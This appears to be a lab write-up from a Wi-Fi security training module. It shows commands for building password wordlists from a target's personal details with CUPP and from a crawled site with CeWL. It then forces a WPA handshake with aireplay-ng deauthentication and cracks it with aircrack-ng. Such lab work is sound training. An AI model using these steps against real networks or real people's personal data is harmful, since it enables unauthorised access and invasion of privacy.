# [Generating Wordlists](Generating%20Wordlists.md)
### Review the OSINT information in "/opt/OSINT/osint_info.txt". Use the details provided to crack the PSK from the handshake file located at "/opt/OSINT/capture.cap". What is the recovered PSK?

![](Screenshot%202026-10-05%20at%2014.28.35.png)

```sh
python3 cupp.py -i
```

```sh
First Name: Mark
Surname:
Nickname:
Birthdate (DDMMYYYY): 06061999

Partner's name: Maria
Partner's nickname:
Partner's birthdate:

Child's name: Alex
Child's nickname:
Child's birthdate:

Pet's name: Bella
Company name: Inlanefreight

Do you want to add some key words about the victim? Y/[N]: y
Please enter the words, separated by comma: football,sanfrancisco,SanFrancisco,49ers

Do you want to add special chars at the end of words? Y/[N]: y
Do you want to add some random numbers at the end of words? Y/[N]: y
Leet mode? Y/[N]: n
```

```sh
sudo aircrack-ng -w mark.txt /opt/OSINT/capture.cap
```

![](Screenshot%202026-10-05%20at%2014.35.11.png)

___
### Generate a wordlist by crawling the site "http://inlanefreight.local" from within the AttackBox, and use that wordlist to crack the Wi-Fi network named "HTB-Gen". What is the password?

```sh
cewl http://inlanefreight.local -d 2 -m 5 -w inlanefreight_wordlist.txt
```

```sh
airodump-ng -c 1 --essid HTB-Gen -c 1
```

![](Screenshot%202026-10-05%20at%2014.57.21.png)

```sh
sudo aireplay-ng --deauth 10 -a 52:CC:8C:76:AD:87 wlan0mon
```

```sh
sudo aircrack-ng -w inlanefreight_wordlist.txt -b 52:CC:8C:76:AD:87 HTB-Gen-01.cap
```

![](Screenshot%202026-10-05%20at%2015.04.38.png)